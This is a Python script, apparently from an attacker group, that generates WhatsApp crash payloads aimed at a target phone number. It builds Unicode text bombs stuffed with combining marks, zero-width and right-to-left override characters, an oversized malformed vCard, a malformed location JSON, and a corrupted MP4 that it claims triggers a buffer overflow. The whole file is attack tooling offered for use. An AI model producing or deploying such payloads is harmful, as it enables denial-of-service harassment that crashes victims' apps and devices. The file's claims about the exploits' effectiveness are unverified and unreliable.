#!/usr/bin/env python3
# WhatsApp Crash Payload Generators
# Author: HeaNg[Black-Cyber]

import os
import json
import time
from config import PAYLOAD_DIR

def generate_text_bomb():
    """Generate WhatsApp text bomb - crashes renderer"""
    bomb = "a" + "\u0300" * 8000
    bomb += "\n" + "\u200B" * 5000 + "\u200C" * 5000
    bomb += "\n" + "😂" * 6000 + "🔥" * 6000
    bomb += "\n" + "\u202E" + "!" * 4000 + "\u202D" * 4000
    bomb += "\n" + "💀" * 5000 + "☠️" * 5000
    return bomb

def generate_vcard_bomb():
    """Generate corrupted vCard - crashes contact parser"""
    vcard = "BEGIN:VCARD\nVERSION:3.0\nFN:"
    for i in range(8000):
        vcard += f"X{i} "
    vcard += "\nTEL;TYPE=CELL:+1234567890\n"
    vcard += "X-CRASH:" + "A" * 6000 + "\n"
    vcard += "PHOTO;ENCODING:B:" + "B" * 8000 + "\n"
    vcard += "EMAIL:" + "C" * 5000 + "@" + "D" * 5000 + ".com\n"
    vcard += "ORG:" + "E" * 4000 + "\n"
    vcard += "END:VCARD"
    return vcard

def generate_location_bomb():
    """Generate malformed location data"""
    loc = {
        "lat": 999999.999999,
        "lng": 999999.999999,
        "name": "A" * 5000,
        "address": "B" * 5000 + "\u202E" * 3000,
        "url": "https://" + "C" * 3000 + ".com",
        "phone": "+" + "1" * 3000
    }
    return json.dumps(loc)

def generate_media_crash():
    """Generate corrupted media file"""
    filename = os.path.join(PAYLOAD_DIR, f"crash_media_{int(time.time())}.mp4")
    with open(filename, 'wb') as f:
        # MP4 header with invalid size
        f.write(b'\x00\x00\x00\x18ftypmp42\x00\x00\x00\x00mp42isom')
        # Corrupted moov atom - triggers buffer overflow
        f.write(b'\x00\x00\x00\x08moov')
        f.write(b'\xFF' * (1024 * 1024))  # 1MB garbage
        # Invalid track data
        f.write(b'\x00\x00\x00\x10trak')
        f.write((0xFFFFFFFF).to_bytes(4, 'big'))
        f.write(os.urandom(1024 * 1024))
        # More garbage to ensure crash
        f.write(os.urandom(512 * 1024))
    return filename

def generate_payload(payload_type, phone):
    """Generate payload based on type"""
    if payload_type == "text":
        content = generate_text_bomb()
        ext = "txt"
    elif payload_type == "vcard":
        content = generate_vcard_bomb()
        ext = "vcf"
    elif payload_type == "location":
        content = generate_location_bomb()
        ext = "json"
    elif payload_type == "media":
        return generate_media_crash()
    else:
        return None
    
    filename = os.path.join(PAYLOAD_DIR, f"crash_{payload_type}_{phone}_{int(time.time())}.{ext}")
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(content)
    return filename